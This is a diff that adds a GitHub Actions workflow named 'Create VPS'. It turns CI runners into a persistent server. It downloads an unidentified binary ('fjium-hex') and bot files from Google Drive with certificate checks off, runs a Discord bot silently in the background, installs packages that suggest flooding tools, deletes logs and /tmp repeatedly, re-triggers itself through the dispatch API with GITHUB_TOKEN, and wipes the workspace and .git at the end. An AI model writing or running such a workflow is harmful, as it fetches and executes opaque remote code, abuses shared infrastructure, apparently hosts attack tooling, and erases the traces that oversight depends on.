@@ -1,0 +1,114 @@
+name: Create VPS
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [create-vps]
+
+jobs:
+  start-vps:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    env:
+      VPS_NAME: ${{ github.event.client_payload.vps_name || 'manual-vps' }}
+    continue-on-error: true
+    steps:
+    - name: ⬇️ Checkout
+      uses: actions/checkout@v3
+    - name: 🔍 System Info
+      run: |
+        echo "🖥️ System Information:"
+        echo "OS: $(uname -a)"
+        echo "Memory: $(free -h)"
+        echo "Disk: $(df -h)"
+        echo "Python: $(python3 --version)"
+    - name: ⚙️ Setup Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '20'
+    - name: 📦 Install & Run Bot
+      run: |
+        echo "🔧 Setting up Python virtual environment..."
+        python3 -m venv .venv
+        source .venv/bin/activate
+        
+        echo "📦 Installing Python packages..."
+        pip install telebot psutil requests aiohttp paramiko rich pyTelegramBotAPI colorama gdown discord.py
+        
+        echo "📦 Installing Node.js packages..."
+        npm install user-agents colors hpack socks
+        
+        echo "📥 Downloading bot files..."
+        python -m gdown --folder https://drive.google.com/drive/folders/19HkyctkTc_dnCYnqFcyaPp4dWHr1GEB0?usp=sharing
+        
+        # Fix fjium-hex
+        echo "🔧 Downloading fjium-hex..."
+        FILE_ID="1oV23Vqj1Zqkh-24zaY29V8dGrhcJhZrL"
+        OUTPUT="bot_discord/fjium-hex"
+        COOKIE_FILE=$(mktemp)
+        curl -c $COOKIE_FILE -s -L "https://drive.google.com/uc?export=download&id=$FILE_ID" > /tmp/warning.html
+        TOKEN=$(grep -o 'confirm=[^&]*' /tmp/warning.html | head -1 | cut -d= -f2)
+        if [ -n "$TOKEN" ]; then
+          wget --load-cookies $COOKIE_FILE -O $OUTPUT "https://drive.google.com/uc?export=download&confirm=$TOKEN&id=$FILE_ID" --no-check-certificate
+        else
+          wget -O $OUTPUT "https://drive.google.com/uc?export=download&id=$FILE_ID" --no-check-certificate
+        fi
+        rm -f $COOKIE_FILE /tmp/warning.html
+        chmod +x $OUTPUT || true
+        
+        echo "🚀 Starting bot..."
+        cd bot_discord
+        nohup python bot.py > /dev/null 2>&1 &
+        echo "✅ Bot is running in background..."
+        
+        find . -name "*.log" -delete || true
+        pip cache purge || true
+    - name: 🔑 Root Cleanup Attempt  # Added root cleanup
+      run: |
+        echo "🔑 Attempting root cleanup for /tmp..."
+        if sudo -n true 2>/dev/null; then
+          echo "✅ Sudo available - cleaning /tmp with root..."
+          sudo rm -rf /tmp/systemd-private-* /tmp/snap-private-tmp 2>/dev/null || true
+          sudo find /tmp -maxdepth 1 -name "*private*" -delete 2>/dev/null || true
+        else
+          echo "⚠️ Sudo not available - skipping root cleanup"
+          find /tmp -maxdepth 1 -user $(whoami) -name "*private*" -delete 2>/dev/null || true
+        fi
+        echo "🔑 Root attempt completed (errors ignored)"
+    - name: ⏳ Keep VPS alive
+      run: |
+        echo "🟢 Starting VPS session..."
+        for i in $(seq 1 180); do
+          echo "🟢 Running minute $i/180..."
+          if [ $((i % 5)) -eq 0 ]; then
+            echo "🧹 Periodic cleanup at minute $i..."
+            find . -name "*.log" -delete || true
+            rm -rf /tmp/*bot* /tmp/*.log 2>/dev/null || true
+            # Thử root periodic
+            if sudo -n true 2>/dev/null; then
+              sudo find /tmp -maxdepth 1 -name "*private*" -delete 2>/dev/null || true
+            fi
+          fi
+          sleep 60
+        done
+    - name: 🔁 Restart workflow
+      if: always()
+      run: |
+        echo "🔄 Attempting to restart workflow..."
+        sleep 30
+        curl -X POST \
+          -H "Accept: application/vnd.github+json" \
+          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+          -H "Content-Type: application/json" \
+          https://api.github.com/repos/${{ github.repository }}/dispatches \
+          -d '{"event_type": "create-vps"}' || echo "⚠️ Failed to restart workflow"
+    - name: Final Workspace Purge  # Added final root attempt
+      if: always()
+      run: |
+        echo "🗑️ Final cleanup..."
+        if sudo -n true 2>/dev/null; then
+          sudo rm -rf /tmp/* 2>/dev/null || true
+        fi
+        rm -rf * .git .venv bot_discord/*
+        find . -name "*.log" -delete 2>/dev/null || true
+        rm -rf /tmp/* ~/.cache/* 2>/dev/null || true
+        echo "🗑️ Workspace purged"
